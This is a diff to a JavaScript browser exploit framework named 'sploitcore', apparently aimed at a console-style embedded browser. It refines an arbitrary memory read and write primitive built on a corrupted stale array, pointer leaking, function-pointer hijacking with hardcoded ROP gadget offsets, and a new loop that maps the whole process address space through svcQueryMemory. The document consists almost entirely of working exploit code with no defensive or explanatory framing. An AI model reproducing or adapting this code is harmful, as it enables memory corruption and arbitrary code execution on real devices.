@@ -40,6 +40,9 @@ function paddr(lo, hi) {
 function nullptr(addr) {
 	return addr[0] == 0 && addr[1] == 0;
 }
+function eq(a, b) {
+	return a[0] == b[0] && a[1] == b[1];
+}
 function add2(addr, off) {
 	if(typeof(off) == 'number')
 		off = [off, 0];
@@ -70,17 +73,17 @@ var sploitcore = function() {
 
 	var numbufs = 1000000;
 	this.bufs = new Array(numbufs);
-	this.bufi = -1;
 
 	this.allocated = {};
 
-	if(!this.setup()) {
+	var bufi = this.setup();
+	if(bufi == -1) {
 		log('~~failed');
 		this.bufs = 0;
 		throw 'Failed.';
 	}
 
-	this.buf = this.bufs[this.bufi];
+	this.buf = this.bufs[bufi];
 
 	this.func = document.getElementById;
 	this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
@@ -95,7 +98,20 @@ var sploitcore = function() {
 	this.stale[1] = this.temp;
 	this.leakaddr = [leaklo, leakhi];
 
-	this.clearBuffers();
+	var taddr = this.getAddr(this);
+	var saddr = this.getAddr(this.stale);
+	var found = false;
+	for(var i = 0; i < 0x1000; i += 2) {
+		if(eq(this.read8(taddr, i), saddr)) {
+			found = true;
+			this.write8([0x00000000, 0xffff0000], taddr, i);
+			break;
+		}
+	}
+	if(!found)
+		throw 'Could not find this.stale';
+
+	this.clearBuffers(bufi);
 
 	this.mainaddr = this.walkList();
 	dlog('Main address ' + paddr(this.mainaddr));
@@ -113,8 +129,8 @@ sploitcore.prototype.setup = function() {
 
 	var first = true;
 	var arr = new Array(0x100);
-	var yolo = new ArrayBuffer(0x1000);
-	arr[0] = yolo;
+	var tbuf = new ArrayBuffer(0x1000);
+	arr[0] = tbuf;
 	arr[1] = 0x13371337;
 
 	var not_number = {};
@@ -154,43 +170,43 @@ sploitcore.prototype.setup = function() {
 	dlog('Checking if triggered...');
 	if(this.stale.length == before_len) {
 		log('Failed to overwrite array');
-		return false;
+		return -1;
 	}
 
 	dlog('Triggered.  New length: 0x' + this.stale.length.toString(16));
 
 	if(this.stale.length < 2 || this.stale.length == 0x1003) {
 		log('Bad length');
-		return false;
+		return -1;
 	}
 
 	this.temp = new Uint32Array(0x10);
-	this.temp[0] = 0x41414141;
 	this.stale[1] = this.temp;
 
 	dlog('Looking for buf...');
 
-	var found = false;
 	for(var i = 0; i < this.bufs.length; ++i) {
 		if(this.bufs[i][0] != 0x41424344) {
-			this.bufi = i;
-			return true;
+			return i;
 		}
 	}
 
 	log('Buffer not found');
-	return false;
+	return -1;
 };
 
-sploitcore.prototype.clearBuffers = function() {
+sploitcore.prototype.clearBuffers = function(bufi) {
+	var kg = new Uint32Array(8);
+	var tuaddr = this.getAddr(this.tu);
+	for(var i = 0; i < 8; ++i)
+		kg[i] = this.read4(tuaddr, i);
+
 	dlog('Clearing useless buffers');
-	// Give ourselves a 'buffer' of 100 buffers around the one we know we hit, for safety
-	var cleared = 0;
 	for(var i = 0; i < this.bufs.length; ++i) {
-		if(!((i <= this.bufi && i + 50 >= this.bufi) || (i >= this.bufi && i - 50 < this.bufi)))
-			this.bufs[i] = 0 * (cleared++);
+		if(i != bufi)
+			this.bufs[i] = 0;
 	}
-	dlog('Done with cleanup.  Cleared ' + cleared + ' buffers');
+	dlog('Done with cleanup.');
 }
 
 sploitcore.prototype.dump = function(name, buf, count) {
@@ -206,6 +222,7 @@ sploitcore.prototype.dumptemp = function(count) {
 sploitcore.prototype.dumpaddr = function(addr, count) {
 	this.buf[4] = addr[0];
 	this.buf[5] = addr[1];
+	this.buf[6] = count;
 	this.dumptemp(count);
 };
 
@@ -214,7 +231,7 @@ sploitcore.prototype.read4 = function(addr, offset) {
 		offset = 0;
 	this.buf[4] = addr[0];
 	this.buf[5] = addr[1];
-	this.buf[6] = 0xFFFFFFFF;
+	this.buf[6] = 1 + offset;
 
 	return this.temp[offset];
 };
@@ -223,7 +240,7 @@ sploitcore.prototype.write4 = function(val, addr, offset) {
 		offset = 0;
 	this.buf[4] = addr[0];
 	this.buf[5] = addr[1];
-	this.buf[6] = 0xFFFFFFFF;
+	this.buf[6] = 1 + offset;
 
 	this.temp[offset] = val;
 };
@@ -247,7 +264,7 @@ sploitcore.prototype.getAddrDestroy = function(obj) {
 	var addr = this.read8(this.read8(this.leakaddr, 4), 4);
 	// Salt the earth.  No object shall ever grow here again.
 	this.write8([0x00000000, 0xffff0000], this.read8(this.leakaddr, 4), 4);
-	this.write8([0x00000000, 0xffff0000], this.leakaddr, 4);
+	//this.write8([0x00000000, 0xffff0000], this.leakaddr, 4);
 	this.leakee['b'] = 0;
 	return addr;
 };
@@ -355,8 +372,8 @@ sploitcore.prototype.getSP = function() {
 	var curptr = this.read8(this.funcaddr, 8);
 
 	var fixed = this.mref(0x91F320);
-	var saved = new Uint32Array(0x1000);
-	for(var i = 0; i < 0x1000; ++i)
+	var saved = new Uint32Array(30);
+	for(var i = 0; i < saved.length; ++i)
 		saved[i] = this.read4(fixed, i);
 	
 	var retaddr = this.mref(0x3E2724); // Second gadget addr
@@ -383,7 +400,7 @@ sploitcore.prototype.getSP = function() {
 	this.write8(curptr, this.funcaddr, 8);
 
 	dlog('Restored original function pointer.');
-	for(var i = 0; i < 0x1000; ++i)
+	for(var i = 0; i < saved.length; ++i)
 		this.write4(saved[i], fixed, i);
 	dlog('Restored data page.');
 
@@ -425,8 +442,8 @@ sploitcore.prototype.call = function(funcptr, args, registers) {
 	dlog('Setting up structs');
 
 	var fixed = this.mref(0x91F320);
-	var saved = new Uint32Array(0x1000);
-	for(var i = 0; i < 0x1000; ++i)
+	var saved = new Uint32Array(12);
+	for(var i = 0; i < saved.length; ++i)
 		saved[i] = this.read4(fixed, i);
 
 	// Begin Gadgets
@@ -542,7 +559,7 @@ sploitcore.prototype.call = function(funcptr, args, registers) {
 
 	dlog('Restored original function pointer.');
 
-	for(var i = 0; i < 0x1000; ++i)
+	for(var i = 0; i < saved.length; ++i)
 		this.write4(saved[i], fixed, i);
 	dlog('Restored data page.');
 
@@ -556,7 +573,9 @@ sploitcore.prototype.call = function(funcptr, args, registers) {
 	return ret;
 };
 
-sploitcore.prototype.querymem = function(addr) {
+sploitcore.prototype.querymem = function(addr, raw) {
+	if(arguments.length == 1)
+		raw = false;
 	var meminfo = this.malloc(0x20);
 	var pageinfo = this.malloc(0x8);
 	var svcQueryMemory = 0x3BBE48;
@@ -564,26 +583,22 @@ sploitcore.prototype.querymem = function(addr) {
 	var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
 	var memstates = ['FREE', 'RESERVED', 'IO', 'STATIC', 'CODE', 'PRIVATE', 'SHARED', 'CONTINUOUS', 'ALIASED', 'ALIAS', 'ALIAS CODE', 'LOCKED'];
 	this.call(svcQueryMemory, [meminfo, pageinfo, addr]);
-	log('svcQueryMemory for ' + paddr(addr))
-	log('Base Virtual Address: ' + paddr(this.read8(meminfo, 0 >> 2)));
-	log('Size: ' + paddr(this.read8(meminfo, 0x8 >> 2)));
 
 	var ms = this.read8(meminfo, 0x10 >> 2);
-	if (ms[1] == 0 && ms[0] < memstates.length) {
-		log('MemoryState: ' + memstates[ms[0]]);
-	} else {
-		log('MemoryState: ' + paddr(ms));
-	}
+	if(!raw && ms[1] == 0 && ms[0] < memstates.length)
+		ms = memstates[ms[0]];
+	else if(!raw)
+		ms = 'UNKNOWN'
 	var mp = this.read8(meminfo, 0x18 >> 2);
-	if (mp[1] == 0 && mp[0] < memperms.length) {
-		log('Permissions: ' + memperms[mp[0]]);
-	} else {
-		log('Permissions: ' + paddr(mp));
-	}
+	if(!raw && mp[1] == 0 && mp[0] < memperms.length)
+		mp = memperms[mp[0]];
 
-	log('PageInfo: ' + paddr(this.read8(pageinfo, 0 >> 2)));
+	var data = [this.read8(meminfo, 0 >> 2), this.read8(meminfo, 0x8 >> 2), ms, mp, this.read8(pageinfo, 0 >> 2)];
+
 	this.free(meminfo);
 	this.free(pageinfo);
+
+	return data;
 };
 
 sploitcore.prototype.bridge = function(ptr, rettype) {
@@ -646,10 +661,23 @@ var int = 'int', char_p = 'char*', void_p = 'void*';
 function main() {
 	var sc = new sploitcore();
 
-	var str = 'this is a test string of length 0x25!';
+	/*var str = 'this is a test string of length 0x25!';
 
 	var strlen = sc.bridge(0x43A6E8, int, char_p);
 	log(paddr(strlen(str)));
 
-	sc.querymem(strlen.addr);
+	sc.querymem(strlen.addr);*/
+
+	var addr = [0, 0];
+	last = [0, 0];
+	while(true) {
+		var mi = sc.querymem(addr);
+		last = addr;
+		addr = add2(mi[0], mi[1]);
+		log(paddr(mi[0]) + ' - ' + paddr(addr) + '  ' + mi[2] + ' ' + mi[3]);
+		if(addr[1] < last[1]) {
+			log('End');
+			break;
+		}
+	}
 }
